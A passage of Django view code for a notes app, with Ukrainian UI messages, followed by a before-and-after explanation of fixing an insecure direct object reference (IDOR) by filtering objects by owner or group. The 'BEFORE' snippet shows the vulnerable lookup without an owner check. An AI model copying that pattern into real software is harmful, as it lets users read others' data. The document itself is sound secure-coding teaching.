    if note.user != request.user:
        # A group member may VIEW the note, but not edit someone else's
        messages.error(request, 'Ти не можеш редагувати нотатку іншого користувача.')
        return redirect('notes_app:note_detail', pk=pk)

    if request.method == 'POST':
        form = NoteForm(request.POST, instance=note, user=request.user)
        if form.is_valid():
            # tags — an M2M field; NoteForm.cleaned_data['tags'] → a QuerySet of Tag objects
            # the service needs tag_ids separately (we don't pass the dict directly!)
            tags = form.cleaned_data.get('tags')
            tag_ids = [t.id for t in tags] if tags else []
            services.update_note(
                note,
                title=form.cleaned_data['title'],
                content=form.cleaned_data.get('content', ''),
                priority=form.cleaned_data.get('priority', note.priority),
                notebook=form.cleaned_data.get('notebook'),
                is_pinned=form.cleaned_data.get('is_pinned', note.is_pinned),
                group=form.cleaned_data.get('group'),
                tag_ids=tag_ids,
            )
            # update_note(note, *, title, content, ...) — keyword-only args
            # You can't call it as update_note(note, form.cleaned_data) → TypeError
            messages.success(request, f'✅ Нотатку "{note.title}" оновлено!')
            return redirect('notes_app:note_detail', pk=note.pk)
    else:
        form = NoteForm(instance=note, user=request.user)

    return render(request, 'notes_app/note_form.html', {
        'form': form,
        'title': f'Редагувати: {note.title}',
        'note': note,
        'action': 'Зберегти зміни',
    })


@login_required
def note_delete(request, pk):
    # Similarly: Q-filter for access + owner check before deletion
    user_groups = request.user.groups.all()
    note = get_object_or_404(
        Note.objects.filter(Q(user=request.user) | Q(group__in=user_groups)),
        pk=pk,
    )
    if note.user != request.user:
        messages.error(request, 'Ти не можеш видалити нотатку іншого користувача.')
        return redirect('notes_app:note_list')
    if request.method == 'POST':
        title = note.title
        services.delete_note(note)
        messages.warning(request, f'🗑️ Нотатку "{title}" видалено.')
        return redirect('notes_app:note_list')
    return render(request, 'notes_app/note_confirm_delete.html', {'note': note})

Before vs After:

# ✗ BEFORE (IDOR vulnerability):
note = get_object_or_404(Note, pk=pk)
# SQL: SELECT * FROM note WHERE pk=43
# Returns Bob's note if pk=43 — no owner check at all!

# ✓ AFTER for personal objects (Notebook, TodoList, etc.):
notebook = get_object_or_404(Notebook, pk=pk, user=request.user)
# SQL: SELECT * FROM notebook WHERE pk=43 AND user_id=42
# pk=43 + user_id=42 → not found → 404

# ✓ AFTER for shared objects (Note — may belong to a group):
user_groups = request.user.groups.all()
note = get_object_or_404(
    Note.objects.filter(Q(user=request.user) | Q(group__in=user_groups)),
    pk=pk,
)
# SQL: SELECT * FROM note WHERE pk=43 AND (user_id=42 OR group_id IN (1,3))
# Owner OR group member — both get read access
# For writing: we additionally check note.user == request.user separately
